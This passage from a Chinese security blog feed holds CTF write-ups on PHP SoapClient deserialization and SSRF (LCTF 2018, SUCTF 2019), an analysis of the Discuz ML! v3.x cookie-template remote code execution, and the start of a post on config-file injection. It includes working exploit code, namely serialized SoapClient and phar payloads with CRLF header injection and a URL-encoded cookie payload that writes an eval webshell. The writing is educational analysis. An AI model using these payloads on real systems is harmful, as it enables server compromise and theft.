$a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">session_start(); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">'only localhost can get flag!'</span>;</span><br><span class="line">$flag = <span class="string">'LCTF&#123;*************************&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>] === <span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">    $_SESSION[<span class="string">'flag'</span>] = $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目非常简洁，就两个文件。flag 的位置也很明确，但这有一个限制，只有来自 localhost 的访问才能将 flag 写入 session 中，意味着需要 SSRF 或者直接 getshell。</p><p>给的提示是反序列化，代码不多，不由得想到 session 里的反序列化，可以看看之前的一个题，<a href="https://wywwzjj.top/2019/02/25/Jarvis-OJ-phpinfo/">从 session 角度学习反序列化</a> （与此题不相同的一点是，这里直接给了写 session 的接口，两题或许可以结合一下）</p><p>参照以前的思路，我们需要设置不同的序列化的处理器，来达到对象注入的目的。如何才能设置呢？</p><p>目光继续聚焦于 <code>session_start</code> ，官方文档给了一个重要提示：配置可覆盖（该进程下临时生效就够了）。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5y600aa7cj20t90h6jut.jpg" alt></p><p>那要注入什么要的对象才能达到 SSRF 的目的呢？由于不能定义其他类，只好从内置类想办法，这时候 SoapClient 就可以闪亮登场了，上面已经铺垫了相关知识，这里着重解释处理手法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>, [<span class="string">'location'</span> =&gt; <span class="string">'http://127.0.0.1/flag.php'</span>,</span><br><span class="line">                           <span class="string">'uri'</span> =&gt; <span class="string">"DDD\r\n"</span> . <span class="string">"Cookie: PHPSESSID=2"</span>]);</span><br><span class="line">   <span class="comment">// 别忘了带 Cookie，不然去哪看 flag ：)</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br><span class="line"></span><br><span class="line"><span class="comment">//O%3A10%3A%22SoapClient%22%3A3%3A%7Bs%3A3%3A%22uri%22%3Bs%3A24%3A%22DDD%0D%0ACookie%3A+PHPSESSID%3D2%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span></span><br></pre></td></tr></table></figure><p>可看到语句成功写入 session</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5y6ncawvjj20yr0h2n0y.jpg" alt></p><p>再正常访问一下，session 里的语句被成功反序列化成为 SoapClient 对象</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5y6pukr6vj20yo0hjn03.jpg" alt></p><p>有人可能还是会有疑问，为什么一定要这样设置呢，不能赋值进去再自动反序列化吗？</p><p>这里多说一下，其实上面的文章已经有写过。先看一下基本的几种序列化的存储方式：</p><ul><li><code>php_binary</code>：键名的长度对应的 ASCII 字符 + 键名 + 经过 <code>serialize ()</code> 函数序列化处理的值</li><li><code>php</code>：键名 + 竖线 + 经过 <code>serialize ()</code> 函数序列处理的值</li><li><code>php_serialize</code> ：经过 <code>serialize ()</code> 函数序列化处理的值</li></ul><p>从 PHP 文档可查到，默认使用 php 这种序列化格式，也就是已经存在竖线的那种方式。</p><p>这种方式的反序列化有个小细节：PHP 获取到 session 字符串后就开始从左至右寻找竖线，找到后以竖线为分隔符，竖线前的为键名，后的做键值，并对键值进行反序列化。如果反序列化失败，则放弃此次解析，再以这样的方式网下寻找继续找。</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">name</span>|<span class="selector-tag">s</span><span class="selector-pseudo">:163</span><span class="selector-pseudo">:"</span>|<span class="selector-tag">O</span><span class="selector-pseudo">:10</span><span class="selector-pseudo">:"SoapClient"</span><span class="selector-pseudo">:4</span>:&#123;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"uri"</span>;<span class="attribute">s</span>:<span class="number">1</span>:<span class="string">"a"</span>;<span class="attribute">s</span>:<span class="number">8</span>:<span class="string">"location"</span>...</span><br></pre></td></tr></table></figure><p>像现在这种情况，出现了两个竖线，就会将后面整个 <code>s:163:&quot;O:&quot;</code> 字符串进行反序列化，得到的很可能就只是一个数组。</p><p>到这里，我们的对象注入总算是成功了，那该如何调用 <code>__call</code> 呢？</p><p>别忘了这还有一个 <code>reset</code> 函数：</p><blockquote><p><strong>reset()</strong> 将 <code>array</code> 的内部指针倒回到第一个单元并返回第一个数组单元的值</p></blockquote><p>也就是说，<code>reset($_SESSION)</code> 将返回的就是 SoapClient 对象，这就很棒了，得来全不费功夫。</p><p>我们可以先把 <code>$b</code> 覆盖成 <code>call_user_func</code> ，以下面这种形式进行调用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(<span class="keyword">array</span>(SoapClient Object, <span class="string">'welcome_to_the_lctf2018'</span>));</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5y6vceceuj20yn0h2goc.jpg" alt></p><p>再正常访问就可以看到 flag 了。</p><h3 id="2019-SUCTF-upload2"><a href="#2019-SUCTF-upload2" class="headerlink" title="2019 SUCTF upload2"></a>2019 SUCTF upload2</h3><blockquote><p>考点：phar 反序列化、反射、SSRF、SoapClient</p></blockquote><p>简单说一下题目大意，有一个上传点（index.php），限制了图片后缀。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"upload"</span>])) &#123;</span><br><span class="line">    <span class="comment">// 允许上传的图片后缀</span></span><br><span class="line">    $allowedExts = <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpeg"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>);</span><br><span class="line">    $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">    $file_name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">    $temp = explode(<span class="string">"."</span>, $file_name);</span><br><span class="line">    $extension = end($temp);</span><br><span class="line">    <span class="keyword">if</span> ((($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</span><br><span class="line">            || ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</span><br><span class="line">            || ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</span><br><span class="line">        &amp;&amp; ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">204800</span>)   <span class="comment">// 小于 200 kb</span></span><br><span class="line">        &amp;&amp; in_array($extension, $allowedExts)</span><br><span class="line">    ) &#123;</span><br><span class="line">        $c = <span class="keyword">new</span> Check($tmp_name);</span><br><span class="line">        $c-&gt;check();</span><br><span class="line">        <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"错误：: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            move_uploaded_file($tmp_name, $userdir . <span class="string">"/"</span> . md5($file_name) . <span class="string">"."</span> . $extension);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"文件存储在: "</span> . $userdir . <span class="string">"/"</span> . md5($file_name) . <span class="string">"."</span> . $extension;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"非法的文件格式"</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>check（class.php）里检查了是否含有 <code>&lt;?</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file_name;</span><br><span class="line">    <span class="keyword">public</span> $type;</span><br><span class="line">    <span class="keyword">public</span> $func = <span class="string">"Check"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file_name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name = $file_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $class = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;func);</span><br><span class="line">        $a = $class-&gt;newInstanceArgs(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        $a-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getMIME</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;type = finfo_file($finfo, <span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        finfo_close($finfo);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;type;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Check</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file_name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name = $file_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $data = file_get_contents(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        <span class="keyword">if</span> (mb_strpos($data, <span class="string">"&lt;?"</span>) !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"&amp;lt;? in contents!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外还有一个查看点（func.php）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i'</span>,$_POST[<span class="string">'url'</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Go away!"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $file_path = $_POST[<span class="string">'url'</span>];</span><br><span class="line">    $file = <span class="keyword">new</span> File($file_path);</span><br><span class="line">    $file-&gt;getMIME();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your file type is '$file' &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目标在 admin.php 里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line">    <span class="comment">// 拿 flag</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由此可知只能打 SSRF，加上前面的一系列限制，直接传 webshell 是不太现实的。</p><p>综合总的题目情景，前一部分和 hitcon 2017 中的 baby^h-master-php-2017 很像，可由 <code>finfo_file($finfo, $this-&gt;file_name)</code> 触发反序列化，再通过 soap 打出 SSRF。</p><p>以下直接给出 exp：（具体分析可参考 De1ta 的 <a href="https://xz.aliyun.com/t/6042#toc-27" target="_blank" rel="noopener">wp</a>）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'test.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'test.txt'</span>,<span class="string">'text'</span>);</span><br><span class="line">$phar-&gt;setStub(<span class="string">'__HALT_COMPILER();'</span>);  <span class="comment">// 并不需要加 <span class="meta">&lt;?</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file_name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $func = <span class="string">"SoapClient"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $target = <span class="string">"http://127.0.0.1/admin.php"</span>;</span><br><span class="line">        $post_string = <span class="string">'admin=&amp;ip=xxx&amp;port=xx&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3='</span>. <span class="string">"\r\n"</span>;</span><br><span class="line">        $headers = [];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name  = [</span><br><span class="line">            <span class="keyword">null</span>,</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,</span><br><span class="line">                  <span class="string">'user_agent'</span>=&gt; str_replace(<span class="string">'^^'</span>, <span class="string">"\r\n"</span>, <span class="string">'xxxxx^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'Content-Length: '</span>. (string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string),</span><br><span class="line">                  <span class="string">'uri'</span>=&gt;<span class="string">'1'</span>)</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$object = <span class="keyword">new</span> File;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($object));</span><br><span class="line">$phar-&gt;setMetadata($object);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>另外还有一些例题，比如：</p><ul><li><p>2018 N1CTF Easy&amp;&amp;Hard PHP</p></li><li><p>2019 De1taCTF shellshellshell</p></li></ul><p>简单小结一下，这些题的情景大都是这样：</p><p>最终目标都受到了 IP 的限制，往往需要打出 SSRF，但并没有找到明显的 SSRF 点，只有一个反序列化的，此时该如何利用呢？</p><p>都指向了原生类——SOAPClient，有了两个 CRLF 的助攻，打出去的 POST 报文几乎完全可控。</p><p>这样的 SOAP，你喜欢吗 ：）</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://pupiles.com/lctf2018.html" target="_blank" rel="noopener">http://pupiles.com/lctf2018.html</a></p><p><a href="https://blog.wonderkun.cc/2018/03/13/n1ctf-hard-php-writeup/" target="_blank" rel="noopener">https://blog.wonderkun.cc/2018/03/13/n1ctf-hard-php-writeup/</a></p><p><a href="https://www.kingkk.com/2018/11/2018-lctf-web-学习篇/" target="_blank" rel="noopener">https://www.kingkk.com/2018/11/2018-lctf-web-学习篇/</a></p><p><a href="https://www.anquanke.com/post/id/164569" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164569</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;SOAP-简介&quot;&gt;&lt;a href=&quot;#SOAP-简介&quot; class=&quot;headerlink&quot; title=&quot;SOAP 简介&quot;&gt;&lt;/a&gt;SOAP 简介&lt;/h2&gt;&lt;p&gt;SOAP（Simple Object Access Protocol）是一种在 web servic
      
    
    </summary>
    
    
      <category term="反序列化" scheme="https://wywwzjj.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="php" scheme="https://wywwzjj.top/tags/php/"/>
    
      <category term="SSRF" scheme="https://wywwzjj.top/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>Discuz ML! V3.X RCE</title>
    <link href="https://wywwzjj.top/2019/07/18/Discuz%20ML!%20V3.X%20RCE/"/>
    <id>https://wywwzjj.top/2019/07/18/Discuz ML! V3.X RCE/</id>
    <published>2019-07-18T15:34:37.000Z</published>
    <updated>2020-01-11T04:45:55.780Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Discuz！ML 是一个由 CodersClub.org 创建的多语言，集成，功能齐全的开源网络平台，用于构建像 “社交网络” 这样的互联网社区。该引擎基于 Comsenz Inc. 创建的着名的 Discuz！X 引擎开发。</p><p>但是，这与常见的 Discuz 论坛还是没多大关系。</p><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>Discuz! ML v.3.4</p><p>Discuz! ML v.3.3</p><p>Discuz! ML v.3.2</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>简单来说，没有经过任何处理的 cookie 直接被拼接进模板，该模板被 include 后自然就执行了。</p><p>（不愧是官方的 Demo）</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g58e9notqaj216u07wwfy.jpg" alt></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>主入口是 upload 目录下的 index.php，没有任何参数的情况下直接载入 forum.php</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g58ftdlnenj20kp01y3yi.jpg" alt></p><p>紧接着 forum.php 又加载了两个核心文件，好戏就要开始了。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g58gas4s7mj20ea026weg.jpg" alt></p><p>class_core.php 中的 39 行 <code>createapp()</code> 开始实例化一个超级对象，再跟一下构造函数</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g58gezo0iij20fn05r0t1.jpg" alt></p><p>环境变量一些初始化以及输入输出的处理全是在这里完成的，焦点锁定到 <code>_init_input()</code> </p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g58gki346wj20kz03owes.jpg" alt></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g58gpf4h2kj20gt0200sr.jpg" alt></p><p>找找这个可控点被用在什么地方</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g58grpn35oj20uq0jfq50.jpg" alt></p><p>其他地方都是包含，这里有个缓存文件，先不管，继续跟，发现开始加载 forum_index.php</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5a8i1nm7dj20ib01y3yg.jpg" alt></p><p>form_index.php 的 433 行开始加载模板</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> template(<span class="string">'diy:forum/discuz:'</span>.$gid);</span><br></pre></td></tr></table></figure><p>之前的那个可控点在这里出现了</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5a8lkglfpj213c00wt8t.jpg" alt></p><p>紧接着被传入了这个函数之中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checktplrefresh($tplfile, $tplfile, @filemtime(DISCUZ_ROOT . $cachefile), $templateid, $cachefile, $tpldir, $file);</span><br></pre></td></tr></table></figure><p>继续跟，在 function_core.php 中的第 523 行 <code>cachefile</code> 被传入进行解析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$template-&gt;parse_template($maintpl, $templateid, $tpldir, $file, $cachefile);</span><br></pre></td></tr></table></figure><p>在 class_template.php 中，读取了一下原有的模板</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dm9l9v9uj20ti02ijrz.jpg" alt></p><p>接着用正则进行替换</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dmbin23bj212r0alaem.jpg" alt></p><p>末尾将写入文件</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dmmlm5z6j20i502gjrg.jpg" alt></p><p>接下来到了激动人心的时刻，这里将拼接我们的恶意语句进入模板</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5a8t4mytgj212d04fwfb.jpg" alt></p><p>但是第一次并不会直接拼接，因为这时候的子模板并没生成，这里先留个印象。</p><p><code>template()</code>将返回一个绝对路径，然后被包含，这时候会执行之前生成的模板，这里继续加载模板。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dmgzw8lxj21ar0i20wh.jpg" alt></p><p>直到这一次加载，恶意语句才真正写入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$headeradd = <span class="string">"</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">|| checktplrefresh('./template/default/common/header.htm', './template/default/common/header_common.htm', 1564153001, '', './data/template/en'.phpinfo().'___common_header_forum_index.tpl.php', './template/default', 'common/header_forum_index')</span></span><br><span class="line"><span class="string">|| checktplrefresh('./template/default/common/header.htm', './template/default/common/header_qmenu.htm', 1564153002, '', './data/template/en'.phpinfo().'___common_header_forum_index.tpl.php', './template/default', 'common/header_forum_index')</span></span><br><span class="line"><span class="string">|| checktplrefresh('./template/default/common/header.htm', './template/default/common/pubsearchform.htm', 1564153002, '', './data/template/en'.phpinfo().'___common_header_forum_index.tpl.php', './template/default', 'common/header_forum_index')</span></span><br><span class="line"><span class="string">;"</span></span><br></pre></td></tr></table></figure><p>可看到具体的位置</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dmpsp4yej21fc04m3zq.jpg" alt></p><p>简化一下就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checktplrefresh(<span class="string">'1'</span>, <span class="string">'2'</span>, <span class="number">1564153002</span>, <span class="string">''</span>, <span class="string">'3'</span>.phpinfo().<span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>)</span><br></pre></td></tr></table></figure><p>自然 <code>phpinfo()</code> 的内容就被拼接到了模板文件中</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dnd8cpnrj20am03mmx3.jpg" alt></p><p>最初生成的文件中还有加载了其他模板，接二连三就生成了好几个文件，最终形成了展示的页面。</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>由于 cookie 中不能有大写字母，写 webshell 时自然不能直接写，这里可以使用 URL 编码来解决。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">27.</span>file_put_contents%<span class="number">28</span>%<span class="number">27</span>confi9.php%<span class="number">27</span>%<span class="number">2</span>Curldecode%<span class="number">28</span>%<span class="number">27</span>%<span class="number">253</span>c%<span class="number">253</span>fphp+%<span class="number">2520</span><span class="keyword">eval</span>%<span class="number">28</span>%<span class="number">2524</span>_%<span class="number">2550</span>%<span class="number">254</span>f%<span class="number">2553</span>%<span class="number">2554</span>%<span class="number">255</span>b1%<span class="number">255</span>d%<span class="number">29</span>%<span class="number">253</span>b%<span class="number">253</span>f%<span class="number">253</span>e%<span class="number">27</span>%<span class="number">29</span>%<span class="number">29.</span>%<span class="number">27</span></span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最初的可控变量被拼接到模板中，再加上生成的模板被包含，此时恶意代码就生效了，导致代码注入。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;Discuz！ML 是一个由 CodersClub.org 创建的多语言，集成，功能齐全的开源网络平台，用于构建像 “社交网络” 这样的互联
      
    
    </summary>
    
    
      <category term="漏洞分析" scheme="https://wywwzjj.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>PHP 写入配置文件经典问题</title>
    <link href="https://wywwzjj.top/2019/07/11/PHP-%E5%86%99%E5%85%A5%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%BB%8F%E5%85%B8%E9%97%AE%E9%A2%98/"/>
    <id>https://wywwzjj.top/2019/07/11/PHP-写入配置文件经典问题/</id>
    <published>2019-07-11T01:36:48.000Z</published>
    <updated>2019-08-26T06:14:57.712Z</updated>
    
    <content type="html"><![CDATA[<p>以下内容是对 wonderkun 师傅这篇 <a href="https://blog.wonderkun.cc/2017/02/28/php%E5%86%99%E5%85%A5%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">文章</a> 的学习。</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'option'</span>])) <span class="keyword">die</span>();</span><br><span class="line">$str = addslashes($_GET[<span class="string">'option'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./config.php'</span>); </span><br><span class="line">$file = preg_replace(<span class="string">'|\$option=\'.*\';|'</span>, <span class="string">"\$option='$str';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./config.php'</span>, $file);</span><br></pre></td></tr></table></figure><p>写入 webshell 需要构造 <code>&#39;</code> 闭合，而 <code>&#39;</code> 直接传入将会被 <code>addslashes</code> 转义，看似安全实则不然。</p><p>未对内容进行处理直接写入是一种极其危险的做法，通过一些小手法就可以为所欲为。</p><h2 id="换行符"><a href="#换行符" class="headerlink" title="换行符"></a>换行符</h2><p><img 